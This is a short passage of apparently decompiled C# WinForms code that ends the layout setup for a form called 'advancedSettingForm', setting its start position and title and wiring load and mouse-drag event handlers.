		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("advancedSettingForm");
		((Form)this).add_Load((EventHandler)advancedSettingForm_Load);
		((Control)this).add_MouseDown(new MouseEventHandler(advancedSettingForm_MouseDown));
		((Control)this).add_MouseMove(new MouseEventHandler(advancedSettingForm_MouseMove));
		((Control)this).add_MouseUp(new MouseEventHandler(advancedSettingForm_MouseUp));
		((Control)panel1).ResumeLayout(false);
		((Control)panel1).PerformLayout();
		((Control)this).ResumeLayout(false);
	}
}
